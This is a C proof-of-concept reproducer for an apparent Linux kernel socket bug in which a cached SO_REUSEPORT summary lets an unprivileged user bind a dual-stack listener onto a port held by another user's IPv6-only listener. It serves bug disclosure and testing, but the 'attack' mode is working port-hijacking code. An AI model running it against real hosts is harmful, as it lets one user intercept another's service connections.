// The bug in the smallest form that shows it: a bind() the kernel's own
// conflict check refuses, which it admits anyway.
//
//   cc -O2 -o reproducer reproducer.c
//   ./reproducer [PORT]           one process: victim, then the attacker
//   ./reproducer victim [PORT]    the victim alone, to run as another user
//   ./reproducer attack [PORT]    the attacker alone, as an unprivileged user
//
// The victim is an IPv6-only listener that set no reuse option of any kind.
//
// The attacker's first socket is an IPv4 wildcard with SO_REUSEPORT. An IPv4
// socket does not conflict with an IPv6-only one, so inet_csk_bind_conflict()
// passes it legitimately, and inet_csk_update_fastreuse() records it as the
// port's FASTREUSEPORT_STRICT summary.
//
// The attacker's second socket is a dual-stack wildcard with SO_REUSEPORT.
// It covers the victim's IPv6 space, so the full check would refuse it. But
// sk_reuseport_match() compares it only against the summary -- whose address
// 0.0.0.0 "covers" [::] in the test's terms, and which records neither the
// v6only scope that matters here nor the bound device -- so
// inet_csk_get_port() skips the conflict check and the bind succeeds.
// listen() takes the same shortcut, and the reuseport group is not allocated
// until inet_hash(), so nothing downstream notices either.
//
// No root, no capability, no network traffic and no second machine. Needs
// only that the port's bucket is in FASTREUSEPORT_STRICT, which it is as soon
// as a socket without SO_REUSEPORT is on the port -- the victim itself.
//
// Exit status is 1 when the attacker's bind is admitted, which is the bug,
// and 0 when it is refused with EADDRINUSE, which is correct.

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static int one = 1, zero = 0;

static int bind_listen(int family, int v6only, int reuseport, int port,
		       const char *what)
{
	struct sockaddr_in6 a6 = { .sin6_family = AF_INET6,
				   .sin6_port = htons(port),
				   .sin6_addr = in6addr_any };
	struct sockaddr_in a4 = { .sin_family = AF_INET,
				  .sin_port = htons(port),
				  .sin_addr.s_addr = htonl(INADDR_ANY) };
	struct sockaddr *sa = family == AF_INET6 ? (struct sockaddr *)&a6
						 : (struct sockaddr *)&a4;
	socklen_t len = family == AF_INET6 ? sizeof(a6) : sizeof(a4);
	int fd = socket(family, SOCK_STREAM, 0);

	if (fd < 0) {
		perror("socket");
		return -1;
	}
	if (family == AF_INET6 &&
	    setsockopt(fd, IPPROTO_IPV6, IPV6_V6ONLY,
		       v6only ? &one : &zero, sizeof(int)) < 0) {
		perror("IPV6_V6ONLY");
		close(fd);
		return -1;
	}
	if (reuseport &&
	    setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one)) < 0) {
		perror("SO_REUSEPORT");
		close(fd);
		return -1;
	}
	if (bind(fd, sa, len) < 0) {
		printf("%-34s bind: %s\n", what, strerror(errno));
		close(fd);
		return -1;
	}
	if (listen(fd, 64) < 0) {
		printf("%-34s listen: %s\n", what, strerror(errno));
		close(fd);
		return -1;
	}
	printf("%-34s bound and listening\n", what);
	return fd;
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 && !atoi(argv[1]) ? argv[1] : "both";
	int port = atoi(argv[argc - 1]);
	int victim = -1, seed, hijack;

	// "victim" blocks in pause() with nothing flushed otherwise.
	setvbuf(stdout, NULL, _IOLBF, 0);
	if (port <= 0)
		port = 29101;
	printf("port %d\n", port);

	if (strcmp(mode, "attack")) {
		victim = bind_listen(AF_INET6, 1, 0, port,
				     "victim  [::] v6only, no reuse");
		if (victim < 0)
			return 2;
		if (!strcmp(mode, "victim")) {
			printf("holding it; run \"%s attack %d\" as another "
			       "user\n", argv[0], port);
			pause();
		}
	}

	seed = bind_listen(AF_INET, 0, 1, port,
			   "seed    0.0.0.0 SO_REUSEPORT");
	if (seed < 0) {
		fprintf(stderr, "the seed was refused, so the port is not in "
				"the state this needs\n");
		return 2;
	}

	hijack = bind_listen(AF_INET6, 0, 1, port,
			     "hijack  [::] dual-stack SO_REUSEPORT");
	if (hijack < 0) {
		printf("\nrefused, which is correct: the hijacking socket "
		       "conflicts with the victim\n");
		return 0;
	}
	printf("\nadmitted: an unprivileged socket is now listening on "
	       "[::]:%d,\nwhich the victim's IPv6-only listener already "
	       "holds. The full conflict\ncheck refuses this; the port's "
	       "cached summary let it through.\n", port);
	return 1;
}
